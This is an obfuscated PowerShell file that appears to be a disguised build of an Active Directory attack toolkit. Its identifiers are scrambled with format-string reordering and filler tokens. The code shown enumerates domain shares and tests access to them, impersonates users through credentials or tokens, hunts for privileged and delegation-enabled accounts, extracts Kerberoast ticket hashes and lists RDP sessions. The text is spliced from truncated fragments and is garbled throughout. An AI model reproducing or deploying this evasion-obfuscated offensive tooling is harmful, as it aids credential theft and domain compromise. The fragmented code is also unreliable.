        [ValidateSet({Z3b{1}{0}Z3b -f S5zseS5z,S5zBaS5z}, {Z3b{0}{1}{2}Z3b-f S5zOS5z,S5zneS5z,S5zLevelS5z}, {Z3b{1}{0}Z3b-f S5zubtreeS5z,S5zSS5z})]
        [String]
        YoV{sEARCIJKHscIJKoIJKPE} = (Z3b{1}{0}{2}Z3b -f S5ztS5z,S5zSubS5z,S5zreeS5z),

        [ValidateRange(1, 10000)]
      ','Properties.samaccountname)S5z : YoV_ Z3b
                }
            }
        }
    }
}


function CoNvERTIJKFROIJKm-IJKlIJKdAPlIJKOIJKGoIJKNhIJKoURs {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{5}{0}{2}{3}{1}{4}{6}Z3b-f S5zeThS5z,S5ziS5z,S5zaS5z,S5znAssS5z,S5zgnmS5z,S5zPSUseDeclaredVarsMorS5z,S5zentsS5z}, S5zS5z)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{1}{0}{4}{3}{2}Z3b -f S5zhouldPrS5z,S5zPSSS5z,S5zsS5z,S5zsS5z,S5zoceS5z}, S5zS5z)]','dpaIJKRaMeTEIJKRs}[(Z3b{0}{2}{1}Z3b-f S5zSS5z,S5zrverS5z,S5zeS5z)]) { YoV{sIJKeARCherIJKArgUIJKmeNIJKTs}[(Z3b{0}{1}Z3b-f S5zServS5z,S5zerS5z)] = YoV{sIJKeRVer} }
        if (YoV{PIJKSbOIJKUNIJKDPIJKARAmeteIJKRs}[(Z3b{3}{2}{0}{1}Z3b-f S5zchScS5z,S5zopeS5z,S5zearS5z,S5zSS5z)]) { YoV{sEarIJKchEIJKRaRgIJKUMents}[(Z3b{0}{1}{2}{3}Z3b-f S5zSS5z,S5zearcS5z,S5zhScoS5z,S5zpeS5z)] = YoV{seIJKArChIJKscOpe} }
        if (YoV{PSbIJKounDPARIJKAmEtEIJKRs}[(Z3b{0}{2}{1}{3}Z3b-fS5zResS5z,S5ztPageSizS5z,S5zulS5z,S5zeS5z)]) { YoV{sEaIJKRCIJKHIJKErIJKAIJKRgUMenTS}[(Z3b{3}{1}{0}{2}Z3b -f S5zsultPageS5z,S5zeS5z,S5zSizeS5z,S5zRS5z)] = YoV{REIJKsIJKUltIJKpagEsIZe} }
        if (YoV{PIJKsBIJKOundPARaIJKmETerS}[(Z3b{4}{3}{2}{0}{1}Z3b-fS5zeLiS5z,S5zmitS5z,S5zTimS5z,S5zerverS5z,S5zSS5z)]) { YoV{seaIJKRCheRARguIJKMeIJKNts}[(Z3b{0}{4}{1}','z,S5zimeLS5z,S5zServerTS5z)] = YoV{seRverIJKTIMeLIIJKMit} }
        if (YoV{PIJKSBIJKOuNDpaIJKRAIJKmEtErs}[(Z3b{0}{1}{2}Z3b-f S5zCreS5z,S5zdeS5z,S5zntialS5z)]) { YoV{DoIJKMaIIJKNgIJKUIJKidMaPIJKAIJKRguMENTs}[(Z3b{1}{0}{2}Z3b -f S5zedentiaS5z,S5zCrS5z,S5zlS5z)] = YoV{CRedeIJKNTIJKIaL} }

        
        if (YoV{PIJKSBIJKOUNIJKdpaRAmIJKETERS}[(Z3b{2}{0}{3}{1}Z3b -f S5zlveS5z,S5zUIDsS5z,S5zResoS5z,S5zGS5z)]) {
 ','S5zervS5z,S5zSS5z,S5zerS5z)]) { YoV{coMIJKpUTERIJKSEARcIJKHeraIJKRGUMENTS}[(Z3b{2}{1}{0}Z3b -f S5zrS5z,S5zveS5z,S5zSerS5z)] = YoV{sERVIJKer} }
        if (YoV{pIJKSbOuNIJKDPARamETeIJKRS}[(Z3b{0}{1}{2}Z3b-f S5zSearchS5z,S5zSS5z,S5zcopeS5z)]) { YoV{CoIJKmpIJKUTeIJKRsIJKeaRcHErIJKArgIJKUmEnts}[(Z3b{0}{1}{2}Z3b-fS5zSearS5z,S5zchS5z,S5zScopeS5z)] = YoV{sIJKEIJKARCHsIJKCope} }
        if (YoV{PsBOUnIJKdpaRIJKAIJKMIJKetErS}[(Z3b{0}{4}{1}{2}{3}Z3b -f S5zRS5z,S5zlS5z,S5ztPageSizS5z,S5zeS5z,S5zesuS5z)]) { YoV{cIJKoIJKmpuTERSeARchEIJKRIJKArIJKgIJKUMIJKeNtS}[(Z3b{4}{1}{0}{3}{2}Z3b-fS5zPageSS5z,S5zsultS5z,S5zzeS5z,S5ziS5z,S5zReS5z)] = YoV{ReSuLIJKTPaGEsIJKIIJKZE} }
        if (YoV{psIJKBoundPAIJKRAIJKmETers}[(Z3b{2}{1}{0}Z3b -fS5zimitS5z,S5zeLS5z,S5zServerTimS5z)]) { YoV{coIJKMPuTERIJKsIJKeIJKArcIJKHeRArGUmENtS}[(Z3b{1}{3}{0}{2}Z3b-f S5zTimeLimS5z,S5zSeS5z,S5zitS5z,S5zrverS5z)] = YoV{SeRvEIJKRIJKTiMeLIMIJKiT} }
        if (YoV{PSIJKBOIJKUndpAraMEteIJKRS}[(Z3b{2}{3}{0}{1}Z3b-fS5zbstS5z,S5zoneS5z,S5zToS5z,S5zmS5z)]) { YoV{CoIJKmPUTIJKEIJKRSeIJKARCIJKhIJKeraRGumIJKeIJKNTS}[(Z3b{1}{2}{0}Z3b -f S5zstoneS5z,S5zToS5z,S5zmbS5z)] = YoV{TOIJKmIJKBstOnE} }
        if (YoV{psIJKBoUndParIJKAMEIJKTers}[(Z3b{2}{1}{0}Z3b -fS5zlS5z,S5ztiaS5z,S5zCredenS5z)]) { YoV{compUtIJKErIJKSeaRCHeIJKRAIJKRGuMEIJKNIJKTs}[(Z3b{1}{2}{3}{0}Z3b -f S5zlS5z,S5zCreS5z,S5zdentiS5z,S5zaS5z)] = YoV{cIJKREIJKdenIJKTIAL} }

        if (YoV{PIJKsBOUndpArAmEIJKTIJKers}[(Z3b{3}{2}{1}{0}Z3b-fS5zeS5z,S5zrNamS5z,S5zmputeS5z,S5zCoS5z)]) {
            YoV{tAIJKRIJKGeIJKTCIJKomPuTeIJKRs} = YoV{CoIJKMpUIJKTEIJKRnIJKAmE}
        }
        else {
            &(Z3b{1}{4}{3}{2}{0}Z3b-f S5zerboseS5z,S5zWS5z,S5ze-VS5z,S5ztS5z,S5zriS5z) (Z3b{4}{1}{0}{5}{7}{6}{3}{8}{2}Z3b -fS5zShare] QuS5z,S5zomainS5z,S5ze domainS5z,S5zsS5z,S5z[Find-DS5z,S5zerying compS5z,S5zrS5z,S5zuteS5z,S5z in thS5z)
            YoV{TaRGIJKetCIJKOIJKmpUTIJKERs} = &(Z3b{1}{3}{0}{2}Z3b -fS5zomS5z,S5zGet-S5z,S5zainComputerS5z,S5zDS5z) @ComputerSearcherArguments JGO &(Z3b{2}{0}{1}Z3b -fS5zjecS5z,S5ztS5z,S5zSelect-ObS5z) -ExpandProperty (Z3b{3}{2}{0}{1}Z3b -fS5zamS5z,S5zeS5z,S5znS5z,S5zdnshostS5z)
        }
        &(Z3b{1}{0}{2}Z3b -f S5zte-S5z,S5zWriS5z,S5zVerboseS5z) Z3b[Find-DomainShare] TargetComputers length: YoV(YoVTargetComputers.Length) Z3b
        if (YoV{tArGeTIJKcIJKoMputIJKEIJKRS}.Z3blEIJKNGTHZ3b -eq 0) {
            throw (Z3b{1}{7}{2}{0}{4}{5}{6}{3}Z3b -f S5zShareS5z,S5z[S5z,S5znS5z,S5zmerateS5z,S5z] S5z,S5zNo hosts found to S5z,S5zenuS5z,S5zFind-DomaiS5z)
        }

        
        YoV{hOSIJKTIJKENUMBLIJKOCK} = {
            Param(YoV{CompIJKUtIJKeRNIJKAIJKme}, YoV{CIJKHeIJKcIJKKshaReacceIJKss}, YoV{tIJKoKIJKENHanIJKDlE})

            if (YoV{tOKIJKenhIJKAnIJKdLe}) {
                
                YoV{NIJKUll} = &(Z3b{4}{0}{5}{1}{3}{2}Z3b-fS5zke-S5z,S5znatS5z,S5znS5z,S5zioS5z,S5zInvoS5z,S5zUserImpersoS5z) -TokenHandle YoV{TokIJKEnhANdIJKlE} -Quiet
            }

            ForEach (YoV{TargIJKETcIJKOIJKmpuTeR} in YoV{coMIJKPUTIJKEIJKRnaIJKME}) {
                YoV{uP} = &(Z3b{0}{2}{3}{1}Z3b-fS5zTest-CS5z,S5zonS5z,S5zonS5z,S5znectiS5z) -Count 1 -Quiet -ComputerName YoV{tAIJKRGIJKetCoMIJKPUtIJKeR}
                if (YoV{uIJKP}) {
                    
                    YoV{sHARIJKeS} = &(Z3b{2}{0}{3}{1}Z3b -f S5zet-NeS5z,S5zreS5z,S5zGS5z,S5ztShaS5z) -ComputerName YoV{tARgIJKEIJKTIJKCOmIJKpUTer}
                    ForEach (YoV{sIJKhIJKAre} in YoV{ShAIJKRIJKEs}) {
                        YoV{sIJKHaRIJKeNaMe} = YoV{shIJKAIJKRE}.Z3bnIJKAmeZ3b
                        
                        YoV{pAIJKTh} = S5z5rj5rjS5z+YoV{tIJKAIJKRGetIJKCIJKoMPuTeR}+S5z5rjS5z+YoV{sHAreIJKNIJKAMe}

                        if ((YoV{shIJKArenaIJKME}) -and (YoV{shAIJKRIJKENaME}.(Z3b{0}{1}Z3b-fS5ztS5z,S5zrimS5z).Invoke() -ne S5zS5z)) {
                            
                            if (YoV{CHecKIJKSIJKHAIJKREaIJKcIJKcesS}) {
                                
                                try {
                                    YoV{NuIJKLl} =   YoV{ZIJKCps}::(Z3b{2}{0}{1}Z3b -f S5zlS5z,S5zesS5z,S5zGetFiS5z).Invoke(YoV{PaIJKTH})
                                    YoV{SHIJKArE}
                                }
                                catch {
                                    &(Z3b{2}{0}{1}{3}Z3b-f S5ztS5z,S5ze-VerbS5z,S5zWriS5z,S5zoseS5z) (S5zErS5z+S5zrS5z+S5zor S5z+S5zaccesS5z+S5zsiS5z+S5zng S5z+S5zsS5z+S5zhareS5z+S5z S5z+S5zpatS5z+S5zh S5z+Z3bYoVPath Z3b+S5z: S5z+Z3bYoV_Z3b)
                                }
                            }
                            else {
                                YoV{shaIJKRE}
                            }
                        }
                    }
                }
            }

            if (YoV{tokeIJKNhANIJKDIJKLE}) {
                &(Z3b{1}{2}{4}{5}{0}{3}Z3b-fS5zeverS5z,S5zIS5z,S5znS5z,S5ztToSelfS5z,S5zvokeS5z,S5z-RS5z)
            }
        }

        YoV{LOIJKgIJKonIJKTOkeN} = YoV{NIJKULl}
        if (YoV{PsBIJKOUndPaIJKRAMeIJKTERs}[(Z3b{1}{2}{0}{3}Z3b -fS5ztS5z,S5zCrS5z,S5zedenS5z,S5zialS5z)]) {
            if (YoV{psbIJKoIJKUIJKNDPIJKArAMeterS}[(Z3b{1}{0}Z3b-f S5zlayS5z,S5zDeS5z)] -or YoV{PSbIJKounDpAIJKRAmEtEIJKRs}[(Z3b{3}{2}{1}{0}Z3b -f S5zessS5z,S5zopOnSuccS5z,S5ztS5z,S5zSS5z)]) {
                YoV{logIJKONtokIJKen} = &(Z3b{1}{4}{3}{2}{0}{5}Z3b-fS5zaS5z,S5zInS5z,S5zImpersonS5z,S5zrS5z,S5zvoke-UseS5z,S5ztionS5z) -Credential YoV{cIJKREIJKDENTIIJKAL}
            }
            else {
                YoV{LoGonToIJKKIJKen} = &(Z3b{0}{4}{6}{2}{1}{5}{3}Z3b -fS5zInvokS5z,S5zonS5z,S5zersS5z,S5zionS5z,S5ze-UsS5z,S5zatS5z,S5zerImpS5z) -Credential YoV{cIJKREIJKDIJKenTial} -Quiet
            }
        }
    }

    PROCESS {
        
        if (YoV{PIJKsBIJKoUndpARAmIJKetIJKeIJKRS}[(Z3b{0}{1}Z3b-fS5zDS5z,S5zelayS5z)] -or YoV{psBouNDIJKpaRamIJKeIJKTerS}[(Z3b{3}{1}{2}{0}Z3b -f S5zssS5z,S5zSS5z,S5zucceS','b -f S5zyS5z,S5zoteprS5z,S5zNS5z,S5zopertS5z) (Z3b{1}{3}{0}{2}Z3b -fS5zhedNaS5z,S5zDistS5z,S5zmeS5','                    }
                            catch {
                                &(Z3b{1}{0}{3}{2}Z3b -fS5zite-S5z,S5zWrS5z,S5zboseS5z,S5zVerS5z) Z3b[Get-DomainGPO] Error calculating gpcfilesyspath for: YoV(YoVGPO.distinguishedname) Z3b
                            }
                        }
                        else {
                            YoV{gIJKpo} = &(Z3b{4}{2}{0}{5}{3}{1}Z3b-f S5zrS5z,S5zyS5z,S5zeS5z,S5zPPropertS5z,S5zConvS5z,S5zt-LDAS5z) -Properties YoV{_}.Z3bpIJKROpIJKErTiesZ3b
                        ','eter(VALUefromPiPELInEBYPROpeRTYNAMe = YoV{TIJKRuE}, ParAmeTersEtnAme = Z3bDIJKYIJKNaMIJKICpARAmEtIJKErZ3b)]
        [switch]YoV{vAIJKlUIJKeFIJKRIJKOmRIJKEmIJKAIJKInINGaRIJKGUMENTS},

        [Parameter(vAlUEFroMpIpElINeByPrOpErTynamE = YoV{tRIJKUe}, PaRaMetErseTnaME = Z3bDyNIJKAMicpIJKArAIJKMeteRZ3b)]
        [string]YoV{PArAmeteIJKRsetNIJKAIJKmE} = Z3b_IJK_aLIJKlPArIJKAIJKMeIJKTErSETSZ3b,

        [Parameter(valueFRomPIpeLIneBYPrOPeRTYnamE = YoV{TRIJKUE}, PARaMetERSetnAMe = Z3bDynamIJKICPARIJKAMIJKeTeRZ3b)]
        [switch]YoV{alloIJKWnIJKULL},

        [Parameter(vaLuefroMPipElINEByPrOPertynaME = YoV{TrIJKUe}, pARameTERSEtNAMe = Z3bdIJKyNamiCPIJKAIJKRaMEterZ3b)]
        [switch]YoV{alLoIJKWIJKeIJKmpTySIJKTring},

        [Parameter(VaLUEFrOMPIpeliNEBYpROpeRtYNAMe = YoV{TrIJKUE}, PArAmetERseTNAmE = Z3bDYnIJKAmIJKicpaIJKRamIJKetERZ3b)]
        [switch]YoV{AlLoWEIJKMIJKpTYcoIJKlIJKLeIJKCtIIJKoN},

        [Parameter(vaLuefROMpIPElineBYPROpertYNAME = YoV{tRIJKUe}, pARAmEtERSeTnAme = Z3bdyNAMiCPIJKArAIJKmIJKEteRZ3b)]
        [switch]YoV{VIJKALIdAtEIJKNotnIJKULL},

        [Parameter(vALuEfROMpiPeLINebyprOperTynAme = YoV{trIJKUE}, pARAmETeRsetnAME = Z3bdYnaMIcPIJKAIJKRaMIJKetIJKERZ3b)]
        [switch]YoV{VIJKALIJKiIJKdatENoIJKTNIJKULLoIJKREMpTY},

        [Parameter(VaLuEFRoMPipelINebyProPERTYnAMe = YoV{tRIJKUe}, parAMeterSETNaME = Z3bdIJKyNAMIcPARAmETIJKerZ3b)]
        [ValidateCount(2,2)]
        [int[]]YoV{VAlidIJKAtIJKEIJKcoUnT},

        [Parameter(vaLuEFROMPipeLiNeByProPERtYname = YoV{TIJKRUE}, ParaMetERSetNAme = Z3bdynAIJKMicpaIJKRAMIJKETeRZ3b)]
        [ValidateCount(2,2)]
        [int[]]YoV{VALIdateRAIJKNIJKGe},','IJKUIJKMenIJKTs} = @{}
        if (YoV{psIJKBoIJKUndpaIJKRAIJKMIJKEters}[(Z3b{1}{0}Z3b -fS5zestS5z,S5zForS5z','S5zYoVIdentityDomainS5z Z3b+S5zfromS5z+S5z S5z+Z3bS5zYoVIdentityInstanceS5zZ3b)
                            YoV{SIJKeArIJKcIJKHerIJKArgUmIJKEnts}[(Z3b{0}{2}{1}Z3b-fS5zDomS5z,S5znS5z,S5zaiS5z)] = YoV{iIJKdeIJKNtitYdOmIJKAIN}
                            YoV{gpoIJKSEarchIJKEr} = &(Z3b{0}{2}{1}{3}Z3b ','}Z3b -fS5zeS5z,S5ziteS5z,S5z-VerbosS5z,S5zWrS5z) Z3b[Get-NetRDPSession] Error: YoV(([ComponentModel.Win32Exception] YoVLastError).Message) Z3b
                }
                
                YoV{nIJKULl} = YoV{wtIJKsaIJKPi32}::(Z3b{0}{3}{2}{1}Z3b -f S5zWTSS5z,S5zverS5z,S5zloseSerS5z,S5zCS5z).Invoke(YoV{haNDIJKlE})
            }
            else {
                &(Z3b{3}{0}{1}{2}{4}Z3','S5z,S5zdS5z,S5zGeS5z,S5zt-S5z) -Name (YoV{pSIJKCmDIJKlIJKeT}.Z3bMYInVIJKoCaIJKTiIJKONZ3b.Z3bINVOcAtIJKionNaIJKMEZ3b)).Z3bPIJKARamETIJKEIJKRSZ3b.(Z3b{2}{0}{3}{1}Z3b -f S5zumeratS5z,S5zrS5z,S5zGetEnS5z,S5zoS5z).Invoke()  JGO
                                        
                                        &(Z3b{1}{0}{3}{2}Z3b-f S5zhere-S5z,S5zWS5z,S5zectS5z,S5zObjS5z) { YoV{_}.Z3bvIJKALUEZ3b.Z3bPARAIJKMeteIJKRseTSZ3b.Z3bKIJKeySZ3b -contains YoV{PscIJKMDLIJKEt}.ParameTerseTNAMe } JGO
                                            &(Z3b{3}{0}{2}{1}Z3b -fS5zelectS5z,S5ztS5z,S5z-ObjecS5z,S5zSS5z) -ExpandProperty (Z3b{0}{1}Z3b-f S5zKS5z,S5zeyS5z) JGO
                                                
 ','CS5z,S5z4)S5z)
            }
            if (YoV{PsIJKBoUIJKNDPArIJKAMIJKeTerS}[(Z3b{2}{1}{0}Z3b-fS5zountS5z,S5zdminCS5z,S5zAS5z)]) {
                &(Z3b{3}{2}{1}{0}{4}Z3b -fS5zVerbosS5z,S5ze-S5z,S5zritS5z,S5zWS5z,S5zeS5z) (Z3b{7}{6}{8}{5}{3}{9}{1}{0}{4}{2}Z3b -fS5znCouS5z,S5zng for admiS5z,S5zt=1S5z,S5z] SS5z,S5znS5z,S5zrS5z,S5zDomainUsS5z,S5z[Get-S5z,S5zeS5z,S5zearchiS5z)
                YoV{fILIJKTeR} += ((Z3b{2}{1}{3}{0}Z3b-fS5z)S5z,S5zunt=S5z,S5z(admincoS5z,S5z1S5z))
            }
            if (YoV{PSbOIJKUndPaIJKRAIJKMETIJKERs}[(Z3b{2}{1}{0}{3}Z3b -fS5zoAS5z,S5zrustedTS5z,S5zTS5z,S5zuthS5z)]) {
                &(Z3b{3}{1}{2}{0}Z3b -fS5zseS5z,S5zrS5z,S5zboS5z,S5zWrite-VeS5z) (Z3b{20}{21}{6}{0}{18}{11}{2}{5}{4}{1}{7}{23}{14}{16}{8}{19}{9}{17}{15}{3}{22}{12}{13}{10}Z3b-f S5zchS5z,S5z uS5z,S5z fS5z,S5zauthentiS5z,S5zrS5z,S5zoS5z,S5z SearS5z,S5zsers thatS5z,S5zteS5z,S5z S5z,S5zr principalsS5z,S5zngS5z,S5zor oS5z,S5ztheS5z,S5z truS5z,S5zo S5z,S5zsS5z,S5ztS5z,S5ziS5z,S5zdS5z,S5z[Get-DomainUsS5z,S5zer]S5z,S5zcate fS5z,S5z areS5z)
                YoV{FIlIJKTEr} += (Z3b{4}{2}{7}{1}{0}{3}{6}{5}Z3b-fS5zgS5z,S5zeleS5z,S5zds-allowedtoS5z,S5zatS5z,S5z(msS5z,S5zto=*)S5z,S5zeS5z,S5zdS5z)
            }
            if (YoV{pSIJKBOUndPaRIJKAIJKmIJKeTEIJKRs}[(Z3b{4}{2}{0}{3}{1}Z3b-fS5zauS5z,S5zredS5z,S5zreS5z,S5zthNotRequiS5z,S5zPS5z)]) {
                &(Z3b{2}{1}{0}{3}Z3b-f S5zerbS5z,S5z-VS5z,S5zWriteS5z,S5zoseS5z','                    YoV{oIJKUT} JGO &(Z3b{2}{0}{3}{1}Z3b -f S5z-S5z,S5zemberS5z,S5zAddS5z,S5zMS5z) (Z3b{1}{2}{0}Z3b-fS5zrtyS5z,S5zNoteprS5z,S5zopeS5z) (Z3b{4}{1}{2}{5}{0}{3}Z3b-fS5zxStrS5z,S5ztS5z,S5zByteHS5z,S5zeamS5z,S5zTickeS5z,S5zeS5z) YoV{NuIJKLl}
                    }
                } else {
                    &(Z3b{2}{0}{1}Z3b-f S5ze-WarS5z,S5zningS5z,S5zWritS5z) Z3bUnable to parse ticket structure for the SPN  YoV(YoVTicket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq Z3b
                    YoV{hIJKAsH} = YoV{nuIJKll}
                    YoV{oIJKUt} JGO &(Z3b{1}{0}{2}Z3b-f S5zeS5z,S5zAdd-MembS5z,S5zrS5z) (Z3b{0}{3}{1}{2}Z3b-fS5zNotS5z,S5zrS5z,S5zopertyS5z,S5zepS5z) (Z3b{1}{4}{3}{5}{2}{0}Z3b-fS5zreamS5z,S5zTS5z,S5zexStS5z,S5zketBS5z,S5zicS5z,S5zyteHS5z) (  ( &(Z3b{2}{1}{0}Z3b -fS5zarIabLeS5z,S5zT-vS5z,S5zgeS5z) AEPSI -vAlUeoNlY )::(Z3b{0}{1}{2}Z3b-fS5zTS5z,S5zoStrS5z,S5zingS5z).Invoke(YoV{ticIJKKeIJKTBIJKYteStrEIJKAM}).(Z3b{1}{0}Z3b-fS5zeS5z,S5zReplacS5z).Invoke(S5z-S5z,S5zS5z))
                }

                if(YoV{hAIJKSh}) {
                    
                    if (YoV{oUIJKTIJKPuTfoRMIJKAT} -match (Z3b{0}{1}Z3b -fS5zJoS5z,S5zhnS5z)) {
                        YoV{hAShIJKFoIJKRmIJKAt} = Z3bIJK','       YoV{ouTIJKput}.Z3bPsIJKoIJKBJEctZ3b.Z3bTYpIJKeNIJKAMesZ3b.(Z3b{0}{2}{1}Z3b-fS5zInsS5z,S5zrtS5z,S5zeS5z).Invoke(0, (Z3b{2}{4}{3}{0}{1}Z3b -f S5zEvS5z,S5zentS5z,S5zPowerS5z,S5zew.LogonS5z,S5zViS5z))
                            YoV{OUIJKTPUT}
                        }
                    }

                    
                    4648 {
                        
                        if((-not YoV{prIJKOIJKpERtiIJKes}[5].Z3bvAIJKluEZ3b.(Z3b{0}{2}{1}Z3b-f S5zEnS5z,S5zthS5z,S5zdsWiS5z).Invoke(S5zYoVS5z)) -and (YoV{PIJKRIJKOpeRIJKTieS}[11].Z3bVAIJKLUeZ3b -match (((Z3b{0}{4}{2}{1}{3}Z3b -fS5ztS5z,S5ztfOT.S5z,S5zosS5z,S5zexeS5z,S5zaskhS5z)).Z3bRIJKEpLIJKAceZ3b(([CHar]102+[CHar]79+[CHar]84),[StRIng][CHar]92)))) {
                            YoV{oUtIJKPIJKUt} = &(Z3b{2}{1}{0}Z3b-f S5z-ObjectS5z,S5zewS5z,S5zNS5z) (Z3b{1}{0}Z3b -fS5ztS5z,S5zPSObjecS5z) -Property @{
                                (Z3b{0}{2}{3}{1}Z3b -fS5zComS5z,S5zameS5z,S5zputerS5z,S5zNS5z)              = YoV{COMpIJKUtIJKeR}
                                (Z3b{2}{0}{1}Z3b -fS5zrS5z,S5zeatedS5z,S5zTimeCS5z)       = YoV{EIJKVIJKeNT}.Z3btiMECIJKReaIJKTIJKedZ3b
                                (Z3b{1}{0}{2}Z3b-fS5znS5z,S5zEveS5z,S5ztIdS5z)           = YoV{EVIJKEIJKNt}.Z3biIJKdZ3b
                                (Z3b{2}{0}{1}{3}Z3b-f S5zubjectS5z,S5zUS5z,S5zSS5z,S5zserSidS5z)    = YoV{pIJKRoIJKPertieS}[0].Z3bvIJKAlUeZ3b.(Z3b{2}{0}{1}Z3b-f S5zoStriS5z,S5zngS5z,S5zTS5z).Invoke()
                                (Z3b{3}{1}{2}{0}{4}Z3b -fS5zerNaS5z,S5ztS5z,S5zUsS5z,S5zSubjecS5z,S5zmeS5z)   = YoV{PRoPEIJKRIJKTIJKieS}[1].Z3bvaIJKlueZ3b
                                (Z3b{3}{5}{0}{1}{4}{2}Z3b -fS5zDoS5z,S5zmaiS5z,S5zmeS5z,S5zSubjS5z,S5znNaS5z,S5zectS5z) = YoV{prOPIJKErtiIJKEs}[2].Z3bvALIJKUEZ3b
                                (Z3b{0}{1}{2}Z3b-fS5zSuS5z,S5zbS5z,S5zjectLogonIdS5z)    = YoV{PROIJKPIJKeRTIJKIeS}[3].Z3bvaIJKLUeZ3b
                                (Z3b{1}{0}{2}Z3b -f S5zogS5z,S5zLS5z,S5zonGuidS5z)         = YoV{PrOIJKPeRIJKTIEs}[4].Z3bvIJKALUEZ3b.(Z3b{0}{1}Z3b -f S5zToStS5z,S5zringS5z).Invoke()
                                (Z3b{1}{2}{0}{3}Z3b-fS5zNaS5z,S5zTargetS5z,S5zUserS5z,S5zmeS5z)    = YoV{pRIJKOPerIJKTIJKieS}[5].Z3bVAIJKLUeZ3b
                                (Z3b{2}{3}{0}{4}{1}Z3b-fS5zetDomaiS5z,S5zeS5z,S5zTarS5z,S5zgS5z,S5znNamS5z)  = YoV{PROPeIJKRtIJKIEs}[6].Z3bvAIJKLUEZ3b
                                (Z3b{4}{0}{2}{3}{1}Z3b-fS5zetLogS5z,S5zdS5z,S5zonS5z,S5zGuiS5z,S5zTargS5z)   = YoV{pROpIJKerIJKTies}[7].Z3bVaIJKLuEZ3b
                                (Z3b{0}{1}{2}{3}{4}Z3b-fS5zTS5z,S5zargetS5z,S5zSS5z,S5zeS5z,S5zrverNameS5z)  = YoV{PIJKRopEIJKRtIES}[8].Z3bvAlIJKUEZ3b
                                (Z3b{2}{0}{3}{1}Z3b -fS5zargS5z,S5zfoS5z,S5zTS5z,S5zetInS5z)        = YoV{prIJKoPIJKErTiEs}[9].Z3bVIJKAlUeZ3b
                                (Z3b{0}{1}Z3b-fS5zProcS5z,S5zessIdS5z','dP','oV{MaIJKpIJKPeDCOIJKMPuIJKTERs}[YoV{HOsIJKTcOmIJKPIJKUIJKTer}] = YoV{trIJKUe}
                }
            }

            YoV{SIJKEARIJKcHeRarGUmEIJKNTs}[(Z3b{1}{0}Z3b -fS5zthS5z,S5zPaS5z)] = YoV{tARIJKgEIJKTIJKpAtH}
            &(Z3b{4}{2}{3}{1}{0}Z3b -f S5zmS5z,S5zeS5z,S5zildS5z,S5zItS5z,S5zGet-ChS5z) @SearcherArguments JGO &(Z3b{1}{0}{2}{4}{3}Z3b -fS5zorS5z,S5zFS5z,S5zEachS5z,S5zectS5z,S5z-ObjS5z) {
                
                YoV{CoIJKNIJKTInuE} = YoV{TRIJKUe}
                if (YoV{pSBOuIJKNDIJKParaIJKmEIJKTERS}[(Z3b{0}{2}{1}Z3b-f S5zExclS5z,S5zdeFoldersS5z,S5zuS5z)] -and (YoV{_}.Z3bPSIIJKscoNIJKTaInIJKerZ3b)) {
                    &(Z3b{0}{3}{2}{1}Z3b -fS5zWS','{0}{1}{3}{2}Z3b -f S5zNoS5z,S5ztS5z,S5zyS5z,S5zepropertS5z) (Z3b{1}{2}{0}Z3b -f S5zrS5z,S5zTargetS','pTr} -as YoV{LOCIJKAlGRoIJKUp_InFoIJK_1}

                        YoV{oFIJKFsIJKET} = YoV{nIJKeWINTPIJKTr}.(Z3b{0}{1}Z3b -fS5zToInt6S5z,S5z4S5z).Invoke()
                        YoV{OfFIJKsIJKet} += YoV{incIJKRemEIJKNT}

                        YoV{LOCIJKAlIJKGRoIJKUP} = &(Z3b{0}{1}{2}Z3b -fS5zNew-OS5z,S5zbjecS5z,S5ztS5z) (Z3b{2}{1}{0}Z3b-f S5zbjectS5z,S5zOS5z,S5zPSS5z)
                        YoV{lIJKOcAIJKlGroIJKUP} JGO &(Z3b{2}{3}{0}{1}Z3b -f S5zd-MS5z,S5zemberS5z,S5zAS5z,S5zdS5z) (Z3b{0}{1}{2}{3}Z3b -f S5zNoS5z,S5ztS5z,S5zeproperS5z,S5ztyS5z) (Z3b{2}{1}{0}Z3b -fS5zuterNameS5z,S5zmpS5z,S5zCoS5z) YoV{COIJKMPIJKUtEr}
                        YoV{LOCaIJKLGIJKRoIJKUp} JGO &(Z3b{0}{2}{1}Z3b-f S5zAddS5z,S5zmberS5z,S5z-MeS5z) (Z3b{2}{1}{0}{3}Z3b-fS5zopertS5z,S5zoteprS5z,S5zNS5z,S5zyS5z) (Z3b{0}{1}{2}Z3b -fS5zGrS5z,S5zoupNS5z,S5zameS5z) YoV{IIJKNFO}.Z3blgrpI1IJK_NAIJKMEZ3b
                        YoV{LOcIJKAlIJKgrOIJKUp} JGO &(Z3b{1}{0}{2}Z3b-f S5zMembeS5z,S5zAdd-S5z,S5zrS5z) (Z3b{2}{0}{1}Z3b-fS5zpropS5z,S5zertyS5z,S5zNoteS5z) (Z3b{1}{0}Z3b -fS5zmmentS5z,S5zCoS5z) YoV{iIJKNFO}.Z3blGIJKRpi1_cIJKOMIJKMENTZ3b
                        YoV{LIJKocaLIJKgrIJKOUp}.Z3bpsOIJKBjeCTZ3b.Z3btIJKYpEnIJKAMesZ3b.(Z3b{0}{2}{1}Z3b -fS5zIS5z,S5zsertS5z,S5znS5z).Invoke(0, (Z3b{3}{2}{1}{4}{0}Z3b-f S5zPIS5z,S5ziew.S5z,S5zVS5z,S5zPowerS5z,S5zLocalGroup.AS5z))
                        YoV{lOcAIJKLgIJKRoUp}
                    }
                    
                    YoV{NuIJKLL} = YoV{NeIJKTIJKAPI32}::(Z3b{1}{0}{3}{2}Z3b-fS5zuffS5z,S5zNetApiBS5z,S5zreeS5z,S5zerFS5z).Invoke(YoV{PIJKTIJKRINfO})
                }
                else {
                    &(Z3b{0}{2}{3}{1}Z3b-f S5zWritS5z,S5zoseS5z,S',',S5zbtreeS5z})]
        [String]
        YoV{SIJKeIJKArchScIJKopE} = (Z3b{1}{0}Z3b-fS5zreeS5z,S5zSubtS5z),

        [ValidateRange(1, 10000)]
        [Int]
        YoV{REIJKsUIJKltPAGESIJKize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{SeIJKRvERtIMEIJKLIMIJKit},

        [Switch]
        YoV{TIJKoMIJKBsTOIJKNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{creDeIJKNTiIJKAl} =  YoV{jIJKFI}::Z3bEMpIJKTYZ3b
    )

    BEGIN {
